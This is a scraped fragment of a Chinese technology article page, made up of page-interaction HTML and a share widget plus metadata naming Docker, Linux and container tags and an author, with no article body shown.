data-post-id=\"114145\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114145votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114145\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Docker,Linux,容器", "author": "Shrikant Lavhate", "front_image_path": "full/e488919f69e980ca011ca1f7af3988436ffd26d1.jpg"}
